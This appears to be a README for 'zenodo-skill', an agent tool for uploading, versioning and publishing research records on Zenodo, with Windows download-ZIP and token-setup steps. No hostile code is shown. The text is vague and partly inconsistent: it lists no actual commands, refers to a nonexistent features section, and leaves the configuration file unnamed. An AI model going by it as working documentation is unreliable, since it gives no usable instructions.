# 📦 zenodo-skill - Manage research data with automated tools

[![Download Zenodo Skill](https://img.shields.io/badge/Download-Zenodo_Skill-blue.svg)](https://github.com/Georgiannebedded725/zenodo-skill)

## 📌 About this project

The zenodo-skill tool helps researchers manage their work on Zenodo. Zenodo stores research data, software, and other materials. This tool works with an automated agent to handle common tasks. It manages the entire process from uploading files to publishing them for the public. You get a permanent link for your work. This link makes your data easy to cite in papers and reports.

The tool handles large files across multiple uploads. It supports metadata, which describes your work for others. It includes safeguards to prevent errors when publishing. You can use it to create new versions of your work while keeping the same reference link. It simplifies the technical steps required to work with the Zenodo interface.

## ⚙️ System Requirements

This application runs on Windows 10 and Windows 11. It needs the following items to work:

*   An internet connection to talk to Zenodo servers.
*   A user account on the Zenodo website.
*   An API access token from your Zenodo account settings. 
*   A base environment where the skill agent runs, such as Claude Code or OpenClaw.

Ensure your computer has at least 500 MB of free storage space. This space handles the temporary files used during the upload process.

## 🚀 Getting Started

Follow these steps to set up the tool on your Windows computer.

1. Visit the repository page to download the necessary files: [https://github.com/Georgiannebedded725/zenodo-skill](https://github.com/Georgiannebedded725/zenodo-skill).
2. Look for the green button marked "Code" on the right side of the page.
3. Select "Download ZIP" from the menu.
4. Open your downloads folder. Find the folder named `zenodo-skill-main`.
5. Right-click the folder and choose "Extract All".
6. Choose a location on your computer to save the files.

## 🛠️ Configuration

You must connect the tool to your Zenodo account.

1. Open your web browser and sign in to [Zenodo](https://zenodo.org).
2. Go to your account settings and find the Applications section.
3. Create a new Personal Access Token.
4. Copy this token string. Keep it in a safe place.
5. In the extracted folder, find the configuration file.
6. Paste your token into the designated area of the file.
7. Save the changes to the file.

The tool defaults to the Zenodo Sandbox environment. This environment acts as a practice area. Use this to test your uploads before you publish them to the live site. When you finish your testing, change the setting in the configuration file to the production server.

## 📂 Usage Guide

The tool uses simple commands to manage your research artifacts.

### Creating a Deposit
To start a new project, use the deposit command. The tool creates a draft on the Zenodo server. It assigns a unique identifier to your work. You can add your title, creator names, and description at this time.

### Uploading Files
Modern research requires large files. This tool handles files up to 50 GB. It breaks files into smaller pieces to ensure a stable upload. You can add up to 100 files to a single record. The system checks the status of every file to ensure no data loss occurs during the transfer.

### Setting Metadata
Metadata provides context for your files. The tool prompts you for key information. This includes the license type and the type of research object. Proper metadata helps people find your work through search engines.

### Publishing
Publishing makes your record public. It generates a Digital Object Identifier, or DOI. This DOI is the permanent link for your research. After publishing, the record cannot change. If you need to make updates, use the versioning feature.

## 🔄 Versioning Your Work

Research evolves over time. You might update your code or add new data to a project. The versioning workflow allows you to release an update. The system links the new version to your original publication. This ensures that readers always see the latest version while keeping the history of the original document.

## 🔎 Searching Records

You can search for research artifacts using the built-in search tool. It looks for public records on the main Zenodo site. You do not need an account or a token for this task. Type your search terms, and the tool returns a list of matching projects with their titles and DOI links.

## 🛡️ Best Practices

*   Use the Sandbox environment for all initial setups and tests.
*   Keep your API token private. Do not share the configuration file with others.
*   Verify your metadata content before you trigger the publish command.
*   Keep regular backups of your source files on your local computer.
*   Check the file sizes before you start an upload to ensure you have enough bandwidth.

If an upload stops for any reason, the tool allows you to resume from the last successful file. This saves time and ensures your progress remains intact. The system logs all actions into a separate file. Look at this log file if you experience an issue or need to see the history of your session.

## ❓ Frequently Asked Questions

**Does this tool work on Mac or Linux?**
While the steps focus on Windows, the underlying technology functions on other platforms that support the necessary shell environment.

**How do I get a DOI?**
The system requests a DOI automatically when you publish a record. The DOI appears in your command output and in your Zenodo dashboard.

**Can I delete an upload?**
You can delete a draft at any time. Published records remain on the servers to ensure the integrity of the research record.

**Is there a limit to the number of records I can create?**
Zenodo does not limit your total number of records, but individual records follow the file size and count limits stated in the features section.